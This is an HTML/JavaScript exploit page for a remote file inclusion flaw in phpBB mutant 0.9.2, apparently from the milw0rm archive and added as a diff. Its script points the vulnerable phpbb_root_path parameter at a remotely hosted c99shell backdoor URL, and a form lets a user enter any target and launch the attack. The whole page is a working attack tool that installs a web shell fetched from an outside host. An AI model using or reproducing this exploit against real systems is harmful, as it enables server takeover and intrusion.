@@ -1,0 +1,57 @@
+<html>
+<head>
+<meta http-equiv="Content-Type" content="text/html; charset=windows-1254">
+<title>phpBB mutant 0.9.2 (phpbb_root_path) Remote File Inclusion Exploit</title>
+
+<script language="JavaScript">
+
+//'Bug found and Exploit coded by bd0rk
+//'Vendor: http://ie.archive.ubuntu.com/sourceforge/p/ph/phpbb22-mutant/mutant-0_9_2.tar.gz
+//'Contact: bd0rk[at]hackermail.com
+
+//'Vulnerable Code: include_once($phpbb_root_path . 'includes/message_parser.'.$phpEx);
+//'$phpbb_root_path is not declared before include
+//'Greetings: str0ke, TheJT, rgod, Perle
+
+//#The german Hacker bd0rk
+
+var dir="/mutant_includes/"
+var file="/mutant_functions.php?"
+var parameter ="phpbb_root_path="
+var shell="http://dot.hazard.free.fr/hacking/exploits/Backdoor/c99shell.txt?"
+
+function command() {
+if (document.rfi.target1.value==""){
+alert("Exploit failed...");
+return false;
+}
+
+rfi.action= document.rfi.target1.value+dir+file+parameter+shell;
+rfi.submit();
+}
+</script>
+</head>
+
+<body bgcolor="#000000">
+<center>
+
+<p><b><font face="Verdana" size="2" color="#008000">phpBB mutant 0.9.2 (phpbb_root_path) Remote File Inclusion Exploit</font></b></p>
+
+<p></p>
+<form method="post" target="getting" name="rfi" onSubmit="command();">
+    <b><font face="Arial" size="1" color="#FF0000">Target:</font><font face="Arial" size="1" color="#808080">[http://[target]/[directory]</font><font color="#00FF00" size="2" face="Arial">
+  </font><font color="#FF0000" size="2">&nbsp;</font></b>
+  <input type="text" name="target1" size="20" style="background-color: #808000" onmouseover="javascript:this.style.background='#808080';" onmouseout="javascript:this.style.background='#808000';"></p>
+  <p><input type="submit" value="Start" name="B1"><input type="reset" value="Delete" name="B2"></p>
+</form>
+<p><br>
+<iframe name="getting" height="337" width="633" scrolling="yes" frameborder="0"></iframe>
+</p>
+
+<b><font face="Verdana" size="2" color="#008000">bd0rk</font></b></p>
+</center>
+</body>
+
+</html>
+
+# milw0rm.com [2007-04-04]
